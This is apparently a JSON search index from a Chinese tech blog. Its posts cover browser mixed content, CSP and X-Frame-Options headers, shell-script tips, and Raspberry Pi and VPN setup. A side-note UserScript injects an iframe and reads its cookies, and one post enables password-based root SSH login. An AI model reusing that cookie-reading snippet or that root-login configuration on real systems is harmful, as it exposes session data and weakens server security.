,css (自動導 https) 順利執行 ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:1:1","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"http 網頁 載 https js css 順利執行 Chrome 好像正常 但 Firefox 會有問題 ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:1:2","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"https 網頁 載 http js css 已封鎖載入混和的主動內容「http://xxxx/css/reset.css」 ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:1:3","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"https 網頁 載 https js css 順利執行 ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:1:4","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"實驗簡單總結 簡單說 https 模式下 不能讀 http 東西，因為不被信任 可能會有網頁安全問題 最佳使用方法//xxxx/css/xxx.css就不會有這個問題 ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:1:5","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"混合內容（mixed content） 主動型混合有分兩種 被動/顯示型混合內容（mixed passive/display content） 主動型混合內容（mixed active content） ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:2:0","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"被動/顯示型混合內容（mixed passive/display content） 被動型混合內容清單 以下列出會被視為被動型混合內容的 HTTP 請求： \u003cimg\u003e（src 屬性） \u003caudio\u003e（src 屬性） \u003cvideo\u003e（src 屬性） \u003cobject\u003e subresource（如果 \u003cobject\u003e 發起 HTTP 請求） ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:2:1","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"主動型混合內容（mixed active content） 主動型混合內容示例 以下列出會被視為主動型混合內容的 HTTP 請求： \u003cscript\u003e（src 屬性） \u003clink\u003e（href 屬性）（包含 CSS 樣式表） \u003ciframe\u003e（src 屬性） XMLHttpRequest 請求 fetch() 請求 所有用到 url 的 CSS 值（@font-face、cursor、background-image……等等）。 \u003cobject\u003e（data 屬性） ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:2:2","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"簡單來說 原本想說怎麼分可以載入根不可以載入，爬了一下文章，安全性比較小是可以取得到資源，危險信高的可能不能執行!! 現代瀏覽器 現代瀏覽器（Chrome、Firefox、Safari、Microsoft Edge），基本上都遵守了 W3C 的 Mixed Content 規範，將 Mixed Content 分為 Optionally-blockable 和 Blockable 兩類： Optionally-blockable 類 Mixed Content 包含那些危險較小，即使被中間人篡改也無大礙的資源。現代瀏覽器默認會加載這類資源，同時會在控制台打印警告信息。這類資源包括： 通過 \u003cimg\u003e 標籤加載的圖片（包括 SVG 圖片）； 通過 \u003cvideo\u003e / \u003caudio\u003e 和 \u003csource\u003e 標籤加載的視頻或音頻； 預讀的（Prefetched）資源； 除此之外所有的 Mixed Content 都是 Blockable，瀏覽器必須禁止加載這類資源。所以現代瀏覽器中，對於 HTTPS 頁面中的 JavaScript、CSS 等 HTTP 資源，一律不加載，直接在控制台打印錯誤信息。 參考: 关于启用 HTTPS 的一些经验分享（一） | JerryQu 的小站 ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:2:3","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"題外話 用 UserScript 方法 unsafeWindow.document.body.innerHTML+='\u003ciframe src=\"https://xxxxxxxx\" width=\"640px\" height=\"400px\" frameborder=\"0\" scrolling=\"no\"\u003e\u003c/iframe\u003e'; console.log(unsafeWindow.frames[0].window.document.cookie); ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:3:0","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"掃 混合內容（mixed content）工具 HTTPS Checker Desktop App | HTTPS Checker GitHub - bramus/mixed-content-scan: Scan your HTTPS-enabled website for Mixed Content ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:4:0","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"讓內容能正常執行和預防方法 一開始我已為這跟 CROS 問題類似，但這個完全是不一樣的東西。 但有類似解決方法。使用 CSP ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:5:0","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"CSP 這個網頁講的很詳細 Content Security Policy (CSP) 筆記 - HackMD 可以簡單用 .htaccess 測試 \u003cIfModule mod_headers.c\u003e Header set Content-Security-Policy \" \\ default-src 'self' xxxxxxx; \\ img-src 'self' data:; \\ \" \u003c/IfModule\u003e 任意網站可以使用 default-src 'self' * Content-Security-Policy - HTTP Headers 的資安議題 (2) | DEVCORE 戴夫寇爾 html \u003chtml\u003e \u003chead\u003e \u003ctitle\u003etest\u003c/title\u003e \u003clink rel=\"stylesheet\" href=\"http://xxxxxxxxxxxxx/reset.css\"\u003e \u003c/head\u003e \u003cbody\u003e Hello World!! \u003ciframe src=\"http://xxxxxxxxx/\" width=\"600\" height=\"100\" frameborder=\"0\" scrolling=\"no\"\u003e\u003c/iframe\u003e \u003c/body\u003e \u003c/html\u003e ~ ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:5:1","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["Web"],"content":"X-Frame-Options iframe 所有 https 都能載入，不然不舊所有網站都可以任意被別的網站崁入? 在 header 加 X-Frame-Options 設定 就可以預防倒 Header always append X-Frame-Options SAMEORIGIN X-Frame-Options 回應標頭 - HTTP | MDN ","date":"2019-11-06","objectID":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/:5:2","tags":["https","web"],"title":"對瀏覽器 混合內容（mixed content）的認識","uri":"/blog/posts/%E5%B0%8D%E7%80%8F%E8%A6%BD%E5%99%A8-%E6%B7%B7%E5%90%88%E5%85%A7%E5%AE%B9mixed-content%E7%9A%84%E8%AA%8D%E8%AD%98/"},{"categories":["PHP"],"content":"實務上 log 不是只會記在頁面上 也會在 console 裡面 \u003c?php ob_start(); var_dump($party); $result = ob_get_clean(); Log::write('result =\u003e '. $result , \"xxxxxxx\" ); ","date":"2019-10-30","objectID":"/blog/posts/PHP-var-dump-%E8%BC%B8%E5%87%BA%E5%88%B0%E8%AE%8A%E6%95%B8%E7%9A%84%E6%96%B9%E6%B3%95/:0:0","tags":["php","var_dump"],"title":"PHP var_dump 輸出到變數的方法","uri":"/blog/posts/PHP-var-dump-%E8%BC%B8%E5%87%BA%E5%88%B0%E8%AE%8A%E6%95%B8%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["Windows"],"content":"最近用 VPN 連到公司網域 但不明原因遠端只要關掉就打不開 只有在重新開機開起 Pulse Secure 可以使用 重開應用程式就不能了 然後過了好幾天，我登入更新完後，就不能用了 移除也移除不了… 網路上看也沒有人解決 orz 只好自己來!!! 移除應用程式，如果順利就重新安裝 不能安裝就繼續往下做，我是遇到 他說 PulseSecureService 不能stopped 我又看了一下服務，不能做設定。所以要想辦法移除 但偏偏不能移除orz sc.exe delete PulseSecureService，執行完需要重開機(PS: 我用powershell) 安裝NTU SSL VPNVPN程式 不知道為什麼我用的VPN網頁裝下來不能用 但是安裝這個就能順利執行 希望看到的大家有解決問題!! ","date":"2019-10-24","objectID":"/blog/posts/Pulse-Secure-%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%9D%E6%96%B9%E6%B3%95/:0:0","tags":["vpn","pulse","secure","vpn"],"title":"Pulse Secure 不能使用，重新安裝方法","uri":"/blog/posts/Pulse-Secure-%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%9D%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Raspberry PI 設定小記 因為最近中華 P883 偶爾連不到 Raspberry Pi 重開 P883 就能使用 不知道是不是在中華數據機設定就會很不穩 所以我想改成設定在 PI 上面 ","date":"2019-10-24","objectID":"/blog/posts/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/:0:0","tags":["raspberry","pi"],"title":"樹莓派(Raspberry PI)設定固定 IP 方法","uri":"/blog/posts/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"設在 Router 機器 vs 設定主機 好處 一般有這兩種，各有優缺點 假如 Router 機器掛掉，裡面資料 IP 有備份可能不用重新設定 但需要買一樣的 數據機 相反主機也是這個道理，目前我看我做網路朋友是選設定主機 ","date":"2019-10-24","objectID":"/blog/posts/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/:1:0","tags":["raspberry","pi"],"title":"樹莓派(Raspberry PI)設定固定 IP 方法","uri":"/blog/posts/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"設定方法 /etc/dhcpcd.conf interface eth0 static ip_address=192.168.1.177 static routers=192.168.1.1 static domain_name_servers=192.168.1.1 ","date":"2019-10-24","objectID":"/blog/posts/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/:2:0","tags":["raspberry","pi"],"title":"樹莓派(Raspberry PI)設定固定 IP 方法","uri":"/blog/posts/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"以前方法 還是紀錄一下 ###################### /etc/network/interfaces ###################### iface eth0 inet static address x.x.x.x netmask x.x.x.x network x.x.x.x broadcast x.x.x.x gateway x.x.x.x ###################### /etc/resolv.conf ###################### nameserver x.x.x.x 參考來源: 葉難: Raspberry Pi：固定私有IP與dhcpcd 小狐狸事務所: 設定樹莓派區網固定 IP 將樹莓派 (Raspberry Pi) 的 eth0 / wlan0 網路介面設定固定 IP - 黃忠義 - Medium ","date":"2019-10-24","objectID":"/blog/posts/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/:3:0","tags":["raspberry","pi"],"title":"樹莓派(Raspberry PI)設定固定 IP 方法","uri":"/blog/posts/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"shell 小記 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:1:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"變數大寫 TODAY=`date +\"%Y%m%d\"` YESTERDAY=`date +\"%Y%m%d\" --date=${TODAY}-1day` ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:1:1","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"變數宣告 = 不能有空白 A = 1234 # A: command not found B=1234 # Success ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:2:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"字串截取 STRING=\"123456789\" echo ${STRING:2:5} # 34567 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:2:1","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"Array 宣告 ARR=(123 456 789) echo ${ARR[2]} # 789 echo ${#ARR[@]} # Array length for i in \"${ARR[@]}\" do echo \"$i\" # or do whatever with individual element of the array done ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:3:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"Array join(合併) 動作 function join_by { local d=$1; shift; echo -n \"$1\"; shift; printf \"%s\" \"${@/#/$d}\"; } How can I join elements of an array in Bash? - Stack Overflow ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:4:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"if 條件判斷 if [ ${#ERROR_ARR[@]} != 0 ] then echo xxxx fi ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:5:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"多個條件判斷 if [ -e $FIND_FILE_320 ] \u0026\u0026 [ -e $FIND_FILE_192 ] \u0026\u0026 [ -e $FIND_FILE_30 ] \u0026\u0026 [ -e $FIND_FILE_ALBUM ] then echo xxx fi ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:5:1","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"mysql 查詢寫回變數 FIND_ARRAY=(mysql -h xxx.xx.xx.xx -D xxxx -u xxx -p__password__ -se \"SELECT xxx FROM xxx WHERE limit 100\") shell处理mysql增、删、改、查 - 奔跑的Man - 博客园 shell中读写mysql数据库 | 赖明星 bash - How concatenate strings with a newline - Stack Overflow MYSQL_CMD=\"/usr/bin/mysql -u ga_user -pxxx -h xxx --database=xxx -s\" FIND_ARRAY=(`echo \"SELECT xxx FROM xxxx WHERE ... and ..... \u003c DATE_ADD(now(),INTERVAL -3 DAY) ORDER BY id LIMIT 100\" | ${MYSQL_CMD}`) FIND_ARRAY=(`mysql -h xxx -D xxx -u xxx -pxxx -se \"SELECT xxx FROM xxx WHERE xxx and DATE_ADD(now(),INTERVAL -3 DAY) LIMIT 100\"`) ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:6:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"function 宣告 function join_by { local d=$1; shift; echo -n \"$1\"; shift; printf \"%s\" \"${@/#/$d}\"; } ERROR_SONG_ID_STRING=$(join_by , ${ERROR_SONG_ID[@]}) join_by , 1 2 3 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:7:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"function 還傳段行字串 #!/bin/bash a_function() { echo -e \"Hello\\nworld\\n 1\" echo \"Hello\" echo \"world\" echo \"Hello\\nworld 4\" } echo -e \"Hello\\nworld\\n 1\" echo \"Hello\" echo \"world\" echo \"Hello\\nworld 4\" x=$(a_function \"x\") echo \"x-no-quotes\u003e\" echo $x #No new lines! echo \"\u003cx-no-quotes\" scripting - How to debug a bash function that returns a value, and how to add newlines to a variable? - Stack Overflow ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:7:1","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"shell script 布林運算順序 shell script 布林運算順序 | 程式狂想筆記 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:7:2","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"有關 * linux bash / shell 有關 * 星號的事情 | 程式狂想筆記 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:8:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"shell 比較字串外面需要包 if 常常遇到[: ==: unary operator expected 那是因為 == 左邊沒有抓到值，或是值為 null 有兩種解決方法： if [ “$app-running” == \"\" ]; if [[ $app-running == \"\" ]]; 參考:Linux 的 shell script 中，遇到 unary operator expected 的解決方法 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:9:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"變數運算 最近使用 shell 做回圈做${index+1} 結果沒有印出來 爬文有找到幾個方法 declare -i來聲明整數變量 x=1 x+=1 echo $x # 2 使用let命令 i=1 let i+=1 echo $i # 2 使用(()) i=1 ((++i)) echo $i # 2 使用expr命令 i=1 i=`expr $i + 1` echo $i # 2 使用$(()) i=1 i=$(($i + 1)) echo $i # 2 使用$[] i=1 i=$[$i + 1] echo $i # 2 我比較喜歡 $(()) 和 (()) 參考來源: Shell中整数自增的几种方式_杰瑞的专栏-CSDN博客 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:10:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"複製檔案 cp 複製檔案可能沒注意的事情 | 程式狂想筆記 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:11:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"shell function 回傳只能數字 一般我們看 shell script function return 回傳值只能是數字 沒法回傳字串，仔細想想也滿有道理的 因為正常程式執行結束會回傳 exit (int) 要確定程式是否有正確執行完成 正常執行完成會回傳0 那有沒有回傳字串方法 我看到是用 function 裡面做 echo 外面用`這個符號去包 滿有趣的寫法 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:12:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"Shell 實作守護進程方法 TODO: LINK ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:13:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"SHELL 大小寫 Bash lowercase and uppercase strings – Linux Hint ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:14:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"在 Shell 腳本中解析選項 在 Shell 腳本中解析選項 | 始終 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:15:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"相關連結 Shell——你只需要了解这么多 - 枣面包的博客 - CSDN博客 [Shell Script] Day27-提高可讀性之函式寫法(三) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Linux Shell函数返回值 - 阳光岛主 - CSDN博客 ","date":"2019-10-23","objectID":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/:16:0","tags":["shell","sh","linux"],"title":"Shell Script 小記","uri":"/blog/posts/Shell-Script-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"最近要測試環境 拿我手上沒在跑的樹莓派開 root 沒想到有幾個流程 因為不常做，所以小記一下 sudo passwd root 打密碼 sudo passwd –unlock root sudo nano /etc/ssh/sshd_config 我沒看到 PermitRootLogin without-password 新增 PermitRootLogin yes reboot 重開機 這樣就能用 root 燈入了 ","date":"2019-10-20","objectID":"/blog/posts/%E5%95%9F%E7%94%A8%E6%A8%B9%E6%A2%85%E6%B4%BE-root-%E5%B8%B3%E8%99%9F/:0:0","tags":["linux"],"title":"啟用樹莓派 root 帳號","uri":"/blog/posts/%E5%95%9F%E7%94%A8%E6%A8%B9%E6%A2%85%E6%B4%BE-root-%E5%B8%B3%E8%99%9F/"},{"categories":["Linux"],"content":"最近使用 sh xxx.sh 出現這個錯誤[[: not found 奇怪，我看語法正確怎麼會有問題 原來發現 sh 跟 bash 是不一樣 改用 bash xxx.sh 就能正常了 sh只是一個符號鏈接，最終指向是一個叫做dash的程序，自Ubuntu 6.10以後，系統的默認shell /bin/sh被改成了dash。dash(the Debian Almquist shell) 是一個比bash小很多但仍兼容POSIX標準的shell，它佔用的磁盤空間更少，執行shell腳本比bash更快，依賴的庫文件更少，當然，在功能上無法與bash相比。dash來自於NetBSD版本的Almquist Shell(ash)。 Ubuntu中將默認shell改為dash的主要原因是效率。由於Ubuntu啟動過程中需要啟動大量的shell腳本，為了優化啟動速度和資源使用情況，Ubuntu做了這樣的改動。 ———————————————— 版权声明：本文为CSDN博主「小猫的嵌入式」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/lucykingljj/article/details/48519069 sh 沒有對應 2 個中誇號，所以才會報錯 ","date":"2019-10-18","objectID":"/blog/posts/Bash-%E5%92%8C-sh-%E6%98%AF%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/:0:0","tags":["bash","sh"],"title":"Bash 和 sh 是不一樣的東西","uri":"/blog/posts/Bash-%E5%92%8C-sh-%E6%98%AF%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/"},{"categories":["Linux"],"content":"最佳執行 .sh 執行方法 只要 xxx.sh 上面有放#! /bin/sh 我們只要./xxx.sh就能順利執行了 就這們簡單!!!! 參考連結: Linux shell腳本執行提示錯誤[[: not found - lucykingljj的專欄 - CSDN博客 it.chinawin.net/os/article-8112.html #!/usr/bin/env bash和#!/bin/bash区别 - 小硕成长空间 - CSDN博客 下面怕沒有時間寫，先預留連結 Store mysql result in a bash array variable - Stack Overflow shell script - How do I capture a MySQL result set in a bash array? - Unix \u0026 Linux Stack Exchange How to Generate XML from XSD in Eclipse - JournalDev Generating Instance Documents From XML Schemas - Help | PhpStorm ","date":"2019-10-18","objectID":"/blog/posts/Bash-%E5%92%8C-sh-%E6%98%AF%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/:1:0","tags":["bash","sh"],"title":"Bash 和 sh 